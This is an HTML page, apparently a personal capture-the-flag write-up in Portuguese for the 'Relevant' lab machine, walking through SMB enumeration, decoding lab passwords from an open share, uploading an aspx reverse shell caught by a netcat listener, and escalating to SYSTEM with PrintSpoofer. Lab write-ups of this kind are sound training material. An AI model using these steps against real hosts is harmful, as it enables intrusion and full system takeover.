@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>Relevant</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link rel="stylesheet" href="../style.css">
+    </head>
+    <body id="body-writeup">
+        
+<pre id="writeup-pre"><span id="span-writeup"><font color="red">my 'Relevant' writeup</font></span> 
+    
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
+⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
+⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
+⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
+⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
+⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
+⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
+⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
+⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
+⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
+⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
+⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟
+⠀⠀⠀⠀
+
+
+    Site: http://relevant.thm
+    IP: 10.10.93.91
+    
+    
+    [nmap]: nmap -vvv -sV -p- 10.10.93.91 -oN nmap.txt
+    
+    PORT      STATE SERVICE       REASON  VERSION
+    80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
+    135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
+    139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+    445/tcp   open  microsoft-ds  syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+    3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
+    49663/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
+    49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
+    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+    
+    
+    
+    Enumerando SMB (Protocolo de rede para compartilhamento de arquivos, pastas e afins entre computadores):
+    
+    [smbclient]: smbclient -N -L //10.10.93.91/
+    
+            Sharename       Type      Comment
+            ---------       ----      -------
+            ADMIN$          Disk      Remote Admin
+            C$              Disk      Default share
+            IPC$            IPC       Remote IPC
+            nt4wrksv        Disk
+    
+    
+    [nmap]: nmap --script smb-enum-shares.nse -p445 10.10.93.91 -T5
+    
+    Host script results:
+    | smb-enum-shares:
+    |   account_used: guest
+    |   \\10.10.93.91\ADMIN$:
+    |     Type: STYPE_DISKTREE_HIDDEN
+    |     Comment: Remote Admin
+    |     Anonymous access: <none>
+    |     Current user access: <none>
+    |   \\10.10.93.91\C$:
+    |     Type: STYPE_DISKTREE_HIDDEN
+    |     Comment: Default share
+    |     Anonymous access: <none>
+    |     Current user access: <none>
+    |   \\10.10.93.91\IPC$:
+    |     Type: STYPE_IPC_HIDDEN
+    |     Comment: Remote IPC
+    |     Anonymous access: <none>
+    |     Current user access: READ/WRITE
+    |   \\10.10.93.91\nt4wrksv:
+    |     Type: STYPE_DISKTREE
+    |     Comment:
+    |     Anonymous access: <none>
+    |_    Current user access: READ/WRITE
+    
+    
+    Enumrando as pastas acessíveis com o usuario "Anonymous".
+    
+    [netexec]: netexec smb 10.10.93.91 -u 'Anonymous' -p '' --shares
+    
+    
+    
+    SMB         10.10.93.91     445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
+    SMB         10.10.93.91     445    RELEVANT         [+] Relevant\Anonymous:
+    SMB         10.10.93.91     445    RELEVANT         [*] Enumerated shares
+    SMB         10.10.93.91     445    RELEVANT         Share           Permissions     Remark
+    SMB         10.10.93.91     445    RELEVANT         -----           -----------     ------
+    SMB         10.10.93.91     445    RELEVANT         ADMIN$                          Remote Admin
+    SMB         10.10.93.91     445    RELEVANT         C$                              Default share
+    SMB         10.10.93.91     445    RELEVANT         IPC$                            Remote IPC
+    SMB         10.10.93.91     445    RELEVANT         nt4wrksv        READ,WRITE
+    
+    
+    Pasta /nt4wrksv/ então vamos tentar logar como anonymous, nesta pasta.
+    
+    [smbclient]: smbclient //10.10.93.91/nt4wrksv -U Anonymous
+    
+    
+    Password for [WORKGROUP\Anonymous]:
+    Try "help" to get a list of possible commands.
+    smb: \> dir
+        .                                   D        0  Thu Nov  7 00:27:17 2024
+        ..                                  D        0  Thu Nov  7 00:27:17 2024
+        passwords.txt                       A       98  Sat Jul 25 12:15:33 2020
+    
+                    7735807 blocks of size 4096. 4947138 blocks available
+    
+    
+    'w00, passwords.txt? lets check this'
+    
+    smb: \> get passwords.txt
+    
+    
+    
+    $: cat passwords.txt
+    
+    [User Passwords - Encoded]
+    Qm9iIC0gIVBAJCRXMHJEITEyMw==
+    QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
+    
+    
+    
+    $: echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d ;echo; echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk"|base64 -d
+    
+    Bob - !P@$$W0rD!123
+    Bill - Juw4nnaM4n420696969!$$$
+    
+    
+    Credenciais de algum lugar, vamos testar.
+    
+    Ok a maquina fechou, nosso novo ip: 10.10.28.175... ok.
+    
+    Olhando para os resultados do nmap novamente, temos esta informação:
+    
+    49663/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+    
+    Tem uma porta HTTP, rodando um serviço da microsoft chamado HTTPAPI
+    
+    
+    Site: http://relevant.thm:49663/nt4wrksv/
+    
+    Podemos acessas o passwords.txt na web:
+    
+    http://relevant.thm:49663/nt4wrksv/passwords.txt
+    
+    Isso significa que podemos fazer uploads de arquivos.
+    
+    Upei uma shell.aspx que roda em ambientes web para windows e coloquei o netcat para ouvir.
+    
+    [netcat]: netcat -lnvp 4444
+    
+    connect to [10.9.0.114] from (UNKNOWN) [10.10.28.175] 49819
+    Spawn Shell...
+    Microsoft Windows [Version 10.0.14393]
+    (c) 2016 Microsoft Corporation. All rights reserved.
+    
+    c:\windows\system32\inetsrv>whoami
+    whoami
+    iis apppool\defaultapppool
+    
+    
+    3nj0yyyy...
+    
+    Só pegar a flag de user que ta na desktop de um dos usuários.
+    
+    Agora para pegar a flag de root, precisaremos nos tornar nt authority.
+    
+    
+    Pesquisei um pouco e a primeira coisa que testei:
+    
+    cmd> whoami /priv
+    
+    
+    PRIVILEGES INFORMATION
+    ----------------------
+    
+    Privilege Name                Description                               State
+    ============================= ========================================= ========
+    SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+    SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+    SeAuditPrivilege              Generate security audits                  Disabled
+    SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+    SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+    SeCreateGlobalPrivilege       Create global objects                     Enabled
+    SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+    
+    
+    Então, pensei em pesquisar um por um e no primeiro, achei um link:
+    
+    https://usersince99.medium.com/windows-privilege-escalation-token-impersonation-seimpersonateprivilege-364b61017070
+    
+    
+    "Windows Privilege Escalation — Token Impersonation (SeImpersonatePrivilege)"
+    
+    Achei esta bela informação:
+    
+    A técnica é chamada de “Token Impersonation”, para isso precisamos de SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege.
+    
+    Esses dois serviços, precisam estar disponíveis, recomendo a leitura:
+    
+    https://www.plesk.com/kb/support/microsoft-windows-seimpersonateprivilege-local-privilege-escalation/
+    
+    Depois de muito tempo, problemas com conexões, vpn caindo toda hora, fora outros problemas na máquina para enviar o arquivo, horas depois deu tudo certo...
+    
+    Encontrei outros, porém este foi o que enviou para o servidor:
+    
+    https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+    
+    PS: leitura sobre isto.
+    
+    c:\inetpub\wwwroot\nt4wrksv>print.exe -i -c cmd.exe
+    print.exe -i -c cmd.exe
+    [+] Found privilege: SeImpersonatePrivilege
+    [+] Named pipe listening...
+    [+] CreateProcessAsUser() OK
+    Microsoft Windows [Version 10.0.14393]
+    (c) 2016 Microsoft Corporation. All rights reserved.
+    
+    C:\Windows\system32>whoami
+    whoami
+    nt authority\system
+    
+    
+    Só ir até a flag root e ja era, cansei... muito problema de conexão nessas vpns e nas maquinas.
+</pre>
+    </body>
+</html>
